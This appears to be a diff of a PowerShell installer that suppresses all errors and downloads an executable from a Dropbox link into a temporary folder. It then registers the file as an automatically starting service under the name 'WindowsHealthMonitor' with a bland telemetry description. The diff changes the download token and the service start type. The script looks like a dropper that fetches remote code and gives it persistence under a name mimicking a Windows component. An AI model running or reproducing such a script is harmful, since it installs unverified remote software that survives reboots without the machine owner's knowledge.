@@ -1,6 +1,6 @@
 $ErrorActionPreference = "SilentlyContinue"
 
-$ClientUrl = "https://www.dropbox.com/scl/fi/g9n5elasjy54dl2kwfntg/MonitorClient.exe?rlkey=wync0ieqrytdi12bugsw6hzu7&st=kb4x9ws1&dl=1"
+$ClientUrl = "https://www.dropbox.com/scl/fi/g9n5elasjy54dl2kwfntg/MonitorClient.exe?rlkey=wync0ieqrytdi12bugsw6hzu7&st=lzyfa0b2&dl=1"
 $WorkDir = "$env:TEMP\WinHealthInstall"
 $ClientExe = "$WorkDir\MonitorClient.exe"
 $ServiceName = "WindowsHealthMonitor"
@@ -39,7 +39,7 @@ if ($service) {
 Copy-Item -Path $ClientExe -Destination $TargetExe -Force
 
 $binPath = "`"$TargetExe`""
-sc.exe create $ServiceName binPath= $binPath start= auto DisplayName= $ServiceDisplay | Out-Null
+sc.exe create $ServiceName binPath= $binPath start= delayed-auto DisplayName= $ServiceDisplay | Out-Null
 sc.exe description $ServiceName "Monitors system health and telemetry." | Out-Null
 
 Start-Service -Name $ServiceName
